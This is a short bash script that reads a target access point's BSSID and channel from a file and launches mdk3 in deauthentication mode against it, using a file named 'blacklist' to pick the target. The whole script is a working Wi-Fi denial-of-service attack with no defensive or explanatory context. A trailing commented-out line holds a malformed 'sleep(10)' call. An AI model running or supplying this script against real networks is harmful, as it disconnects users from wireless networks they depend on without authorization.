#!/bin/bash

targetBSSID=$(cat targetList.txt | awk '{print $1}')
echo "Target BSSID: $targetBSSID"
targetChannel=$(cat targetList.txt | awk '{print $6}')
echo "Target Channel: $targetChannel"
interface=$(cat interfaceToUse.txt)
echo "Using interface: $interface"

echo $targetBSSID > blacklist

sudo mdk3 $interface d -b blacklist -c $targetChannel 
#&& PID=$! && sleep(10) && kill -9 $PID
